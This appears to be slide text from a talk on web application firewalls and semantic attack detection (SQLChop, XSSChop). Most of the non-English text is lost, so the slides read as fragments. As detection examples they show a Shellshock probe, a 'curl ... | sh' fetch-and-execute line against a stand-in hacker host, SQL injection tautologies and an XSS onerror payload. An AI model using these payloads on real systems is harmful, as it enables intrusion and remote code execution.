zTrix 

WAF

WAF
 WebWeb Application Firewall  WAFWAF  
 360WAF  WebRAYWAF
 Gartner Imperva 

Web
 Web
 Web  Web
   Web 
 Web
 SQLXSS  Struts2ImageMagick
   Gopher 

WAF

WAF
 WAFWeb
 JIT    
 WAF
     
 WAF
     

WAF
 WAF
   
 
 +    WAFWAF


WAF
 1.  2.  3. WAF


2014  shellshock 
$ env x='() { :;}; echo vulnerable' bash -c 'echo hello'

    

----shellshock
Bash 

----shellshock

$ env x='('') { :;}; echo vulnerable' bash -c 'echo hello' 

----shellshock


----shellshock
   ${XX}  

----
  shell

----
  $ curl http://hacker-website.org/my.html | sh  ...


  bash  



; ` & | > ? { } [ ] $ echo _user_input_here_


Command Substitution


 https://en.wikipedia.org/wiki/Finite-state_machine
  Chomsky Hierarchy  Type-3 Grammar Type-0 Grammer 
  
  BlackHat 2005, Hansan  Patterson   ( http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-HansenPatterson/HP2005.pdf)


2015 SQLChop SQL  BlackHat Arsenal 2015XSSChop  XSS  PHPPHPJava  






 payload     ->  -> / 

----
Context Free Grammar  O(n)  
xxxx' or '1'='1 <img src=1 href=1 onerror="javascript:alert(1)"></img> '() { :;}; echo vulnerable' bash -c 'echo hello'


?
Javascript    Semantic Conditions 

----
 BNF


       


  
  SQL  findAndModify MongoDB  
  

----SQLSQLChop

SQL

union select 1 from users where password = 'admin'



Student union representative should be those best students that you can select from this class



We should select the best students from this class as the student union representative

----SQLSQLChop
SQLChop 
<type bareword> <type string> <type number> <type string> <type number> 
xxxx' or '1'='1
 <type string> <keyword or> <type string> <operator => <type string>

----SQLSQLChop
SQLChop  token  SQL   BNF 
SQL expr 

----SQLSQLChop
 WAF  SQL  SQL  

SQL

http://xxx.org/?q=union%20select%201%20from%20users%20where%201=1



http://xxx.org/?q=Student%20union%20representative%20should%20be%20tho se%20best%20students%20that%20you%20can%20select%20from%20this%20class

----SQLChop Demo
http://sqlchop.chaitin.com/

----XSSXSSChop
<img src=1 href=1 onerror="javascript:alert(1)"></img>
tag_name = "img" attr_name = "onerror" attr_value = "javascript:alert(1)"

----XSSXSSChop
  
 Javascript SQL  ECMAScript 2017 

----XSSChop Demo
http://xsschop.chaitin.com/


  Payload   bool
  


SQL 231+1 SQL  WAF   

?
WAF  

WAF----WAF
  IP/session  IP/Session   IP/session SQL   

WAF----
 IP/Session  WAF 
  IP/Session  IP  

WAF----WAF
      URL 
    

WAF----WAF
 
   
 
   WAF  URL 
 
 WAF  SNMP   
 ...  ...


  Imperva     

---- WAF 
       
         ++ 
  


WAF   WAF  WAF 
 1.  2.  3. WAF

One more thing...
WAF/SafeLine "" 



Thanks!
 

